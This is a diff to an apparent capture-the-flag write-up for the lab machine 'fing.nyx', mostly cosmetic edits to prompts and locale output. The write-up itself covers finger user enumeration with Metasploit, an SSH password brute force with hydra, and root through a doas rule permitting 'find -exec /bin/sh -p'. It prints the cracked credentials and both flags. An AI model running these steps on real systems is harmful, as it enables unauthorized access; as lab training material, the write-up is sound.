@@ -19,7 +19,7 @@ The `finger` service — an old protocol for querying user info on a remote syst
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn fing.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn fing.nyx
 
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
@@ -31,11 +31,11 @@ MAC Address: 00:0C:29:CA:12:A8 (VMware)
 Three ports are found open: **22 (SSH)**, **79 (finger)**, and **80 (HTTP)**. `finger` in particular is worth noting — it's a legacy service, rarely seen exposed today, historically used to query information about users on a remote system. A version/script scan against all three fills in the details:
 
 ```bash
-sudo nmap -p 22,79,80 -sCV fing.nyx
+$ sudo nmap -p 22,79,80 -sCV fing.nyx
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
 |   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
 |_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
@@ -58,7 +58,7 @@ http://fing.nyx
 <img src="../Images/fing/Pasted image 20260518175754.png"/>
 
 ```bash
-gobuster dir -u 'http://fing.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+$ gobuster dir -u 'http://fing.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 
 ===============================================================
 Starting gobuster in directory enumeration mode
@@ -76,7 +76,7 @@ Finished
 Rather than the web app, `finger` itself is the more interesting service — it can be queried to check whether a given name corresponds to a real account. Metasploit's dedicated scanner automates trying a whole list of candidate names:
 
 ```bash
-msfconsole -q
+$ msfconsole -q
 msf auxiliary(scanner/finger/finger_users) > set USERS_FILE /usr/share/seclists/Usernames/Names/names.txt
 USERS_FILE ⇒ /usr/share/seclists/Usernames/Names/names.txt
 msf auxiliary(scanner/finger/finger_users) > run
@@ -95,7 +95,7 @@ The scan confirms `adam` as a valid username.
 With a real username in hand, a focused SSH brute force is far more efficient than guessing both username and password at once:
 
 ```bash
-hydra -l 'adam' -P /usr/share/wordlists/rockyou.txt ssh://fing.nyx
+$ hydra -l 'adam' -P /usr/share/wordlists/rockyou.txt ssh://fing.nyx
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 17:43:19
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
@@ -108,15 +108,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 17:43:
 > **Credentials:** `adam:passion`
 
 ```bash
-ssh adam@fing.nyx
-adam@192.168.1.164's password: 
+$ ssh adam@fing.nyx
+adam@fing.nyx's password:
 Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
 Last login: Sun Apr 23 13:21:44 2023 from 192.168.1.10
 adam@fing:~$ id
-uid=1000(adam) gid=1000(adam) grupos=1000(adam)
+uid=1000(adam) gid=1000(adam) groups=1000(adam)
 adam@fing:~$ ls -l /home/adam
 total 4
--r-------- 1 adam adam 33 abr 23  2023 user.txt
+-r-------- 1 adam adam 33 Apr 23  2023 user.txt
 adam@fing:~$ cat /home/adam/user.txt
 ff18a9aca2d1dac41a5c26e6667bea9d
 ```
@@ -129,24 +129,24 @@ ff18a9aca2d1dac41a5c26e6667bea9d
 
 ```bash
 adam@fing:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
--rwsr-xr-x 1 root root 55528 ene 20  2022 /usr/bin/mount
--rwsr-xr-x 1 root root 71912 ene 20  2022 /usr/bin/su
--rwsr-xr-x 1 root root 58416 feb  7 2020 /usr/bin/chfn
--rwsr-xr-x 1 root root 39008 feb  5 2021 /usr/bin/doas
--rwsr-xr-x 1 root root 88304 feb  7 2020 /usr/bin/gpasswd
--rwsr-xr-x 1 root root 52880 feb  7 2020 /usr/bin/chsh
--rwsr-xr-x 1 root root 35040 ene 20  2022 /usr/bin/umount
--rwsr-xr-x 1 root root 63960 feb  7 2020 /usr/bin/passwd
--rwsr-xr-x 1 root root 44632 feb  7 2020 /usr/bin/newgrp
--rwsr-xr-x 1 root root 481608 jul  2 2022 /usr/lib/openssh/ssh-keysign
--rwsr-xr-- 1 root messagebus 51336 oct  5 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
+-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 58416 Feb  7 2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 39008 Feb  5 2021 /usr/bin/doas
+-rwsr-xr-x 1 root root 88304 Feb  7 2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 52880 Feb  7 2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
+-rwsr-xr-x 1 root root 63960 Feb  7 2020 /usr/bin/passwd
+-rwsr-xr-x 1 root root 44632 Feb  7 2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 481608 Jul  2 2022 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51336 Oct  5 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
 Nothing obvious turns up among SUID binaries, so `doas` — a smaller, OpenBSD-originated alternative to `sudo`, also available on Linux — is checked next:
 
 ```bash
 adam@fing:~$ ls -l /etc/doas.conf
--rw-r--r-- 1 root root 53 abr 23  2023 /etc/doas.conf
+-rw-r--r-- 1 root root 53 Apr 23  2023 /etc/doas.conf
 adam@fing:~$ cat /etc/doas.conf
 permit nopass keepenv adam as root cmd /usr/bin/find
 ```
@@ -156,10 +156,10 @@ permit nopass keepenv adam as root cmd /usr/bin/find
 ```bash
 adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh -p \; -quit
 # id
-uid=0(root) gid=0(root) grupos=0(root)
+uid=0(root) gid=0(root) groups=0(root)
 # ls -l /root
 total 4
--r-------- 1 root root 33 abr 23  2023 root.txt
+-r-------- 1 root root 33 Apr 23  2023 root.txt
 # cat /root/root.txt
 1edf2dfe68c6745e93affa42be9a80ce
 ```
